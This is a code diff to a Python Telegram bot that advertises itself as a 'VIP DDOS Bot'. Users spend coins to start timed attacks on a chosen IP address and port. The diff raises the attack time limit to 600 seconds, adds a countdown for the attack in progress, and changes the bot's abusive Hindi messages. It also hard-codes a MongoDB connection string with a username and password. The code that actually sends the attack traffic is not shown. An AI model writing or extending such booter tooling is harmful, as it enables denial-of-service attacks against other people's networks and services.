@@ -10,7 +10,7 @@ MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
 DB_NAME = "dake"
 COLLECTION_NAME = "users"
 attack_in_progress = False
-ATTACK_TIME_LIMIT = 300  # Maximum attack duration in seconds
+ATTACK_TIME_LIMIT = 600  # Maximum attack duration in seconds
 COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack
 
 # MongoDB setup
@@ -36,7 +36,7 @@ async def update_user(user_id, coins):
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*🔥 Oye Chutiye! Welcome to LEGENDARY VIP DDOS Bot! 🔥*\n\n"
+        "*🔥 Orr Chutiye! Welcome to LEGENDARY VIP DDOS Bot! 🔥*\n\n"
         "*Use /help Kyu Ki Tumko Toh Kuch Aata Nahi😂*\n"
         "*Aur haan, hacker banne ka sapna dekhna band kar aur ab drama shuru kar! ⚔️💥*"
     )
@@ -47,7 +47,7 @@ async def daku(update: Update, context: CallbackContext):
     args = context.args
 
     if chat_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Chal nikal! Tera aukaat nahi hai yeh command chalane ki. Admin se baat kar pehle.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*🖕 Chal nikal! Tera aukaat nahi hai yeh command chalane ki. Admin se baat kar pehle.*", parse_mode='Markdown')
         return
 
     if len(args) != 3:
@@ -63,14 +63,19 @@ async def daku(update: Update, context: CallbackContext):
     if command == 'add':
         new_balance = user["coins"] + coins
         await update_user(target_user_id, new_balance)
-        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} ko {coins} coins diye gaye. Balance: {new_balance}.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ko {coins} coins diye gaye. Balance: {new_balance}.*", parse_mode='Markdown')
     elif command == 'rem':
         new_balance = max(0, user["coins"] - coins)
         await update_user(target_user_id, new_balance)
-        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} ke {coins} coins kaat diye. Balance: {new_balance}.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ke {coins} coins kaat diye. Balance: {new_balance}.*", parse_mode='Markdown')
+
+from datetime import datetime, timedelta
+
+# Add this global variable
+attack_end_time = None  # Stores the end time of the ongoing attack
 
 async def attack(update: Update, context: CallbackContext):
-    global attack_in_progress
+    global attack_in_progress, attack_end_time
 
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
@@ -79,11 +84,16 @@ async def attack(update: Update, context: CallbackContext):
     user = await get_user(user_id)
 
     if user["coins"] < COINS_REQUIRED_PER_ATTACK:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Chal bhai, tere paas toh coins ka chillar bhi nahi hai. Admin ke saamne haath jod!* 😂", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*😂 Chal bhai, tere paas toh coins ka chillar bhi nahi hai. Admin ke saamne haath jod!* 😂", parse_mode='Markdown')
         return
 
     if attack_in_progress:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Arre bhai, chill kar! Ek aur attack already chal raha hai. Itna desperate mat ban.*", parse_mode='Markdown')
+        remaining_time = (attack_end_time - datetime.now()).total_seconds()
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=f"*⚠️ Arre bhai, chill kar! Ek aur attack already chal raha hai. Baaki {int(remaining_time)} seconds mein khatam hoga.*",
+            parse_mode='Markdown'
+        )
         return
 
     if len(args) != 3:
@@ -94,13 +104,14 @@ async def attack(update: Update, context: CallbackContext):
     duration = int(duration)
 
     if duration > ATTACK_TIME_LIMIT:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Bhai, tumhare sapne bade hain, par limit {ATTACK_TIME_LIMIT} seconds ki hai. Zyada hawa mein mat ud!*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text=f"*🤡 Bhai, tumhare sapne bade hain, par limit {ATTACK_TIME_LIMIT} seconds ki hai. Zyada hawa mein mat ud!*", parse_mode='Markdown')
         return
 
     # Deduct coins
     new_balance = user["coins"] - COINS_REQUIRED_PER_ATTACK
     await update_user(user_id, new_balance)
 
+    attack_end_time = datetime.now() + timedelta(seconds=duration)  # Set the attack end time
     await context.bot.send_message(chat_id=chat_id, text=(
         f"*⚔️ ATTACK START KIYA HAI, FAKE HACKER! ⚔️*\n"
         f"*🎯 Target: {ip}:{port}*\n"
@@ -113,7 +124,7 @@ async def attack(update: Update, context: CallbackContext):
     asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
 
 async def run_attack(chat_id, ip, port, duration, context):
-    global attack_in_progress
+    global attack_in_progress, attack_end_time
     attack_in_progress = True
 
     try:
@@ -135,8 +146,9 @@ async def run_attack(chat_id, ip, port, duration, context):
 
     finally:
         attack_in_progress = False
+        attack_end_time = None  # Reset end time
         await context.bot.send_message(chat_id=chat_id, text="*✅ Attack khatam ho gaya! Chal ab ja, ghar pe roti kha aur zindagi jeene ki koshish kar.*", parse_mode='Markdown')
-
+        
 async def myinfo(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
